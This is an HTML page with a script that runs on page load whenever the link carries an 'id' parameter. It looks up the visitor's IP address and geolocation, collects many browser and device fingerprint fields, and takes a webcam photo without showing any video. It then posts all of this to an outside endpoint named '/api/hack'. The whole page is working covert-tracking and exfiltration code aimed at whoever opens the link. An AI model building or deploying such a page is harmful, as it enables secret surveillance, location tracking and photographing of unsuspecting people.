<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture User Data and Webcam Image</title>
</head>
<body>
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js/dist/ua-parser.min.js"></script>
    <script>
        // Function to capture user data and webcam image
        async function myFunction() {
            const queryString = window.location.search; // Get the query string from the URL
            const urlParams = new URLSearchParams(queryString);
            const usrId = urlParams.get('id'); // Retrieve the 'id' parameter

            if (usrId) {
                const uap = new UAParser();
                uap.setUA(navigator.userAgent);
                const result = uap.getResult();

                // Function to get the user's IP address
                async function getUserIP() {
                    try {
                        const response = await fetch('https://api.ipify.org?format=json');
                        const data = await response.json();
                        return data.ip; // Returns the user's IP address
                    } catch (error) {
                        console.error('Error fetching IP address:', error);
                        return null; // Return null if there was an error
                    }
                }

                // Function to get the user's full address based on IP
                async function getUserAddress(ip) {
                    try {
                        const response = await fetch(`https://ipapi.co/${ip}/json/`);
                        const data = await response.json();
                        return {
                            city: data.city,
                            region: data.region,
                            country: data.country,
                            postal: data.postal,
                            formattedAddress: data.formatted_address || `${data.city}, ${data.region}, ${data.country}` // Full address
                        };
                    } catch (error) {
                        console.error('Error fetching address:', error);
                        return null; // Return null if there was an error
                    }
                }

                // Capture image from webcam without displaying video
                async function captureImage() {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);
                    const photo = await imageCapture.takePhoto();
                    track.stop(); // Stop the video stream

                    // Convert to base64
                    const reader = new FileReader();
                    reader.readAsDataURL(photo);
                    return new Promise((resolve) => {
                        reader.onloadend = () => {
                            resolve(reader.result); // Return base64 string
                        };
                    });
                }

                // Example code for automatic data capture without button
                const ip = await getUserIP();
                let address = null;
                if (ip) {
                    // Get user's full address based on IP
                    address = await getUserAddress(ip);
                }

                // Capture webcam image in base64
                const imageData = await captureImage();

                // Collect user data
                const userData = {
                    usrId: usrId,
                    ipAddress: ip || "Unknown",
                    location: address ? address.formattedAddress : "Unknown",
                    userAgent: navigator.userAgent,
                    operatingSystem: navigator.platform,
                    browserInfo: `${result.browser.name} ${result.browser.version}`,
                    deviceModel: `${result.device.vendor || 'Unknown'} ${result.device.model || 'Unknown'}`,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    touchSupport: 'ontouchstart' in window,
                    connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                    deviceMemory: navigator.deviceMemory || 'Unknown',
                    colorDepth: window.screen.colorDepth,
                    cookiesEnabled: navigator.cookieEnabled,
                    javaEnabled: navigator.javaEnabled(),
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints,
                    doNotTrack: navigator.doNotTrack,
                    serviceWorkerStatus: 'serviceWorker' in navigator,
                    bluetoothStatus: 'bluetooth' in navigator,
                    isMobile: /android|bb\d+|meego|mobile|iphone|ipad/i.test(navigator.userAgent),
                    image: imageData // Include captured image in base64
                };

                console.log(JSON.stringify(userData));

                // Send the data to the PHP endpoint
                fetch('https://test-iota-vert-22.vercel.app/api/hack', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(userData),
                })
                .then(response => response.text())
                .then(data => {
                    console.log('Data sent successfully');
                    document.getElementById('hi').innerHTML = data;
                })
                .catch((error) => {
                    console.error('Error sending data:', error);
                    document.getElementById('hi').innerHTML = error;
                });
            }
        }

        // Run the function on page load
        window.onload = function() {
            myFunction(); 
        };
    </script>
</body>
</html>
